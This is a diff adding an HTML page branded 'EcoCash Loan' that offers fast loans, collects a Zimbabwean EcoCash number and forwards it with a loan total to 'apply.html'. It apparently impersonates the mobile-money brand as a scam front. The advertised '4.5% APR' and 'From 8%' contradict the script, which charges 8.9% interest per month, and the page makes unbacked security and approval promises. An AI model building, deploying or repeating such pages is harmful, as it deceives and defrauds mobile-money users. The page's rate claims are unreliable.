@@ -1,0 +1,534 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <meta name="theme-color" content="#f5f5f5">
+    <title>EcoCash Loan</title>
+    <style>
+        :root {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, sans-serif;
+            color: #333;
+            background: #f5f5f5;
+            font-synthesis: none;
+            text-rendering: optimizeLegibility;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        * { box-sizing: border-box; }
+
+        html, body { margin: 0; min-width: 320px; min-height: 100%; }
+
+        body {
+            background: #f5f5f5;
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+
+        button, input { font: inherit; }
+        button { -webkit-tap-highlight-color: transparent; }
+
+        #root {
+            width: 100%;
+            min-height: 100vh;
+            margin: 0;
+            text-align: center;
+        }
+
+        .loan-calculator-container {
+            width: 100%;
+            max-width: 410px;
+            min-height: 100svh;
+            margin: 0 auto;
+            padding: 15px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            background: #f5f5f5;
+            overflow: hidden;
+        }
+
+        .top-header {
+            width: 100%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 10px 20px;
+            margin-bottom: 20px;
+            border-bottom: 2px solid #11bb4a;
+            background: #f5f5f5;
+        }
+
+        .ecocash-logo {
+            display: inline-flex;
+            align-items: center;
+            margin-right: 24px;
+            color: #0056a6;
+            font-size: clamp(1.55rem, 7vw, 2rem);
+            font-weight: 800;
+            letter-spacing: -1.2px;
+            line-height: 1;
+            text-decoration: none;
+        }
+
+        .ecocash-logo .cash-word { color: #e30613; }
+
+        .welcome-block {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            flex: 0 0 auto;
+        }
+
+        .welcome-icon {
+            width: 36px;
+            height: 36px;
+            color: #001eff;
+        }
+
+        .welcome-block h1 {
+            margin: 0;
+            color: #333;
+            font-size: 18px;
+            line-height: 1.2;
+        }
+
+        .calculator-header {
+            width: 100%;
+            margin-bottom: 20px;
+            padding: 10px 0;
+            color: #089e08;
+            text-align: center;
+        }
+
+        .calculator-header h1 {
+            margin: 0 0 8px;
+            font-size: 1.8rem;
+            font-weight: 700;
+            letter-spacing: -.3px;
+            line-height: 1.3;
+        }
+
+        .fast-text {
+            color: #1c1180;
+            text-shadow: 1px 1px 3px rgba(0, 0, 0, .3);
+        }
+
+        .subtitle {
+            margin: 0;
+            padding: 0 10px;
+            font-size: .9rem;
+            font-weight: 300;
+            letter-spacing: .3px;
+            line-height: 1.4;
+        }
+
+        .calculator-content {
+            width: 100%;
+            display: grid;
+            grid-template-columns: minmax(0, 1fr);
+            gap: 20px;
+            padding: 20px;
+            background: #fff;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, .2);
+        }
+
+        .calculator-section {
+            display: flex;
+            flex-direction: column;
+            min-width: 0;
+        }
+
+        .section-title {
+            margin: 0 0 18px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #eee;
+            color: #333;
+            font-size: 1.4rem;
+            font-weight: 700;
+        }
+
+        .calculator-control { margin-bottom: 18px; }
+
+        .control-label {
+            display: block;
+            margin-bottom: 7px;
+            color: #555;
+            font-size: .75rem;
+            font-weight: 700;
+            letter-spacing: .7px;
+            text-transform: uppercase;
+        }
+
+        .amount-display,
+        .term-display {
+            margin-bottom: 8px;
+            color: #333;
+            font-size: 1.35rem;
+            font-weight: 700;
+            line-height: 1.2;
+        }
+
+        .slider-container { width: 100%; }
+
+        .amount-slider {
+            width: 100%;
+            height: 7px;
+            margin: 0;
+            accent-color: #11bb4a;
+            cursor: pointer;
+        }
+
+        .slider-labels {
+            display: flex;
+            justify-content: space-between;
+            gap: 10px;
+            margin-top: 5px;
+            color: #777;
+            font-size: .65rem;
+        }
+
+        .term-range-labels {
+            margin-top: 7px;
+        }
+
+        .term-buttons {
+            display: grid;
+            grid-template-columns: repeat(3, minmax(0, 1fr));
+            gap: 8px;
+        }
+
+        .term-button {
+            min-height: 38px;
+            padding: 6px 4px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            background: #fff;
+            color: #333;
+            font-size: .78rem;
+            cursor: pointer;
+            transition: background-color .2s ease, color .2s ease, border-color .2s ease;
+        }
+
+        .term-button:hover { border-color: #11bb4a; }
+
+        .term-button.active {
+            border-color: #11bb4a;
+            background: #11bb4a;
+            color: #fff;
+            font-weight: 700;
+        }
+
+        .phone-control { margin-top: 2px; margin-bottom: 18px; }
+
+        .phone-field {
+            display: flex;
+            align-items: center;
+            width: 100%;
+            min-height: 44px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            background: #fff;
+            overflow: hidden;
+        }
+
+        .phone-prefix {
+            padding: 0 10px;
+            border-right: 1px solid #ddd;
+            color: #333;
+            font-size: .9rem;
+            font-weight: 600;
+        }
+
+        .phone-input {
+            width: 100%;
+            min-width: 0;
+            padding: 10px;
+            border: 0;
+            outline: 0;
+            background: transparent;
+            color: #333;
+            font-size: .9rem;
+        }
+
+        .phone-input:focus { box-shadow: inset 0 0 0 2px rgba(17, 187, 74, .25); }
+
+        .payment-display {
+            padding: 16px 12px;
+            border: 1px solid #e1e5ef;
+            border-radius: 10px;
+            background: #f7f8ff;
+        }
+
+        .payment-label {
+            color: #777;
+            font-size: .65rem;
+            font-weight: 700;
+            letter-spacing: .8px;
+            text-transform: uppercase;
+        }
+
+        .payment-amount {
+            margin: 4px 0;
+            color: #333;
+            font-size: 1.55rem;
+            font-weight: 700;
+        }
+
+        .interest-rate { color: #777; font-size: .65rem; }
+
+        .apply-button {
+            width: 100%;
+            min-height: 48px;
+            margin-top: 18px;
+            padding: 12px 16px;
+            border: 0;
+            border-radius: 10px;
+            background: #27275a;
+            color: #fff;
+            font-size: .85rem;
+            font-weight: 700;
+            letter-spacing: .5px;
+            cursor: pointer;
+            transition: background-color .2s ease, transform .2s ease;
+        }
+
+        .apply-button:hover { background: #1c1c47; }
+        .apply-button:active { transform: translateY(1px); }
+        .apply-button:disabled { cursor: wait; opacity: .75; }
+
+        .features-section {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 10px;
+        }
+
+        .feature-card {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            min-width: 0;
+            padding: 10px;
+            border: 1px solid #e1e5ef;
+            border-radius: 10px;
+            background: #f7f8ff;
+            text-align: left;
+        }
+
+        .feature-icon {
+            display: grid;
+            flex: 0 0 42px;
+            width: 42px;
+            height: 42px;
+            place-items: center;
+            border-radius: 50%;
+            background: radial-gradient(circle at 35% 30%, #7249a1, #160033 75%);
+            font-size: 1.15rem;
+        }
+
+        .feature-content { min-width: 0; }
+        .feature-title { margin: 0 0 2px; color: #333; font-size: .78rem; font-weight: 700; }
+        .feature-desc { margin: 0; color: #777; font-size: .65rem; line-height: 1.25; }
+
+        /* Keep every section stacked vertically on desktop, tablet, and mobile. */
+        .calculator-content {
+            grid-template-columns: minmax(0, 1fr);
+            gap: 20px;
+            max-height: none;
+            overflow: visible;
+        }
+
+        .features-section {
+            width: 100%;
+            display: grid;
+            grid-template-columns: minmax(0, 1fr);
+            gap: 10px;
+            margin-top: 0;
+        }
+
+        @media (max-height: 700px) {
+            .loan-calculator-container { justify-content: flex-start; }
+            .calculator-content { padding: 16px; }
+        }
+
+        @media (orientation: landscape) and (max-height: 500px) {
+            .loan-calculator-container { padding: 10px; }
+            .calculator-content { gap: 16px; }
+        }
+
+        @media (max-width: 380px) {
+            .loan-calculator-container { padding: 12px; }
+            .ecocash-logo { margin-right: 12px; font-size: 1.45rem; }
+            .calculator-content { padding: 16px; }
+            .calculator-header h1 { font-size: 1.55rem; }
+            .term-buttons { gap: 6px; }
+            .term-button { font-size: .72rem; }
+        }
+
+        @media (prefers-reduced-motion: reduce) {
+            *, *::before, *::after { transition-duration: .01ms !important; animation-duration: .01ms !important; }
+        }
+    </style>
+</head>
+<body>
+    <div id="root">
+        <main class="loan-calculator-container">
+            <header class="top-header">
+                <a class="ecocash-logo" href="#" aria-label="EcoCash home"><span>Eco</span><span class="cash-word">Cash</span></a>
+                <div class="welcome-block">
+                    <svg class="welcome-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+                        <path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"></path>
+                        <circle cx="12" cy="7" r="4"></circle>
+                    </svg>
+                    <h1>Welcome</h1>
+                </div>
+            </header>
+
+            <section class="calculator-header" aria-labelledby="page-title">
+                <h1 id="page-title">Get Your Loan Approved <span class="fast-text">Fast</span></h1>
+                <p class="subtitle">Quick approval • Competitive rates • Flexible terms</p>
+            </section>
+
+            <section class="calculator-content" aria-label="Loan calculator">
+                <div class="calculator-section">
+                    <h2 class="section-title">Loan Calculator</h2>
+
+                    <div class="calculator-control">
+                        <label class="control-label" for="amount-slider">Loan Amount</label>
+                        <div class="amount-display" id="amount-display">$500</div>
+                        <div class="slider-container">
+                            <input id="amount-slider" class="amount-slider" type="range" min="500" max="50000" step="100" value="500" aria-label="Loan amount">
+                            <div class="slider-labels"><span>USD 500</span><span>USD 50,000</span></div>
+                        </div>
+                    </div>
+
+                    <div class="calculator-control">
+                        <div class="control-label">Loan Term</div>
+                        <div class="term-display" id="term-display">12 months</div>
+                        <div class="term-buttons" role="group" aria-label="Loan term">
+                            <button class="term-button" type="button" data-months="6">6 months</button>
+                            <button class="term-button active" type="button" data-months="12">12 months</button>
+                            <button class="term-button" type="button" data-months="24">24 months</button>
+                            <button class="term-button" type="button" data-months="36">36 months</button>
+                            <button class="term-button" type="button" data-months="48">48 months</button>
+                            <button class="term-button" type="button" data-months="60">60 months</button>
+                        </div>
+                        <div class="slider-labels term-range-labels" aria-hidden="true">
+                            <span>6 months</span>
+                            <span>60 months</span>
+                        </div>
+                    </div>
+
+                    <div class="calculator-control phone-control">
+                        <label class="control-label" for="phone-input">EcoCash Number</label>
+                        <div class="phone-field">
+                            <span class="phone-prefix">+263</span>
+                            <input id="phone-input" class="phone-input" type="tel" inputmode="numeric" autocomplete="tel" placeholder="7XXXXXXXX" maxlength="9" aria-label="EcoCash number">
+                        </div>
+                    </div>
+
+                    <div class="payment-display">
+                        <div class="payment-label">Monthly Payment</div>
+                        <div class="payment-amount" id="payment-amount">$42.69</div>
+                        <div class="interest-rate">Interest rate: 4.5% APR</div>
+                    </div>
+
+                    <button class="apply-button" id="apply-button" type="button">APPLY NOW</button>
+                </div>
+
+                <aside class="features-section" aria-label="Loan benefits">
+                    <div class="feature-card"><div class="feature-icon" aria-hidden="true">⚡</div><div class="feature-content"><h3 class="feature-title">Fast Approval</h3><p class="feature-desc">Within 24 hours</p></div></div>
+                    <div class="feature-card"><div class="feature-icon" aria-hidden="true">💰</div><div class="feature-content"><h3 class="feature-title">Low Rates</h3><p class="feature-desc">From 8%</p></div></div>
+                    <div class="feature-card"><div class="feature-icon" aria-hidden="true">🔒</div><div class="feature-content"><h3 class="feature-title">Secure</h3><p class="feature-desc">Bank-level security</p></div></div>
+                </aside>
+            </section>
+        </main>
+    </div>
+
+    <script>
+        const amountSlider = document.getElementById('amount-slider');
+        const amountDisplay = document.getElementById('amount-display');
+        const termDisplay = document.getElementById('term-display');
+        const paymentAmount = document.getElementById('payment-amount');
+        const phoneInput = document.getElementById('phone-input');
+        const applyButton = document.getElementById('apply-button');
+        const termButtons = [...document.querySelectorAll('.term-button')];
+
+        const MONTHLY_INTEREST = 0.089;
+        const REDIRECT_PAGE = 'apply.html';
+        let selectedTerm = 12;
+
+        function formatCurrency(value, decimals = 0) {
+            return '$' + Number(value).toLocaleString(undefined, {
+                minimumFractionDigits: decimals,
+                maximumFractionDigits: decimals
+            });
+        }
+
+        function updateCalculator() {
+            const amount = Number(amountSlider.value);
+            const totalRepayment = amount + (amount * MONTHLY_INTEREST * selectedTerm);
+            const monthlyPayment = totalRepayment / selectedTerm;
+
+            amountDisplay.textContent = formatCurrency(amount);
+            termDisplay.textContent = `${selectedTerm} months`;
+            paymentAmount.textContent = formatCurrency(monthlyPayment, 2);
+        }
+
+        amountSlider.addEventListener('input', updateCalculator);
+
+        termButtons.forEach((button) => {
+            button.addEventListener('click', () => {
+                selectedTerm = Number(button.dataset.months);
+                termButtons.forEach((item) => item.classList.toggle('active', item === button));
+                updateCalculator();
+            });
+        });
+
+        phoneInput.addEventListener('input', function () {
+            let value = this.value.replace(/\D/g, '');
+            if (value.length > 0 && value[0] !== '7') value = '';
+            this.value = value.slice(0, 9);
+        });
+
+        applyButton.addEventListener('click', function () {
+            const phone = phoneInput.value;
+            if (phone.length !== 9) {
+                alert('Please enter a valid 9-digit EcoCash number starting with 7');
+                phoneInput.focus();
+                return;
+            }
+
+            this.disabled = true;
+            this.textContent = 'PROCESSING...';
+
+            const term = `${selectedTerm} months Loan`;
+            const total = (Number(amountSlider.value) + (Number(amountSlider.value) * MONTHLY_INTEREST * selectedTerm)).toFixed(2);
+            const query = new URLSearchParams({ phone, data: term, price: total });
+
+            setTimeout(() => {
+                window.location.href = `${REDIRECT_PAGE}?${query.toString()}`;
+            }, 1200);
+        });
+
+        updateCalculator();
+    </script>
+
+    <!--Start of Tawk.to Script-->
+<script type="text/javascript">
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/66e3f4cf50c10f7a00a9500d/default';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
+</script>
+<!--End of Tawk.to Script-->
+</body>
+</html>
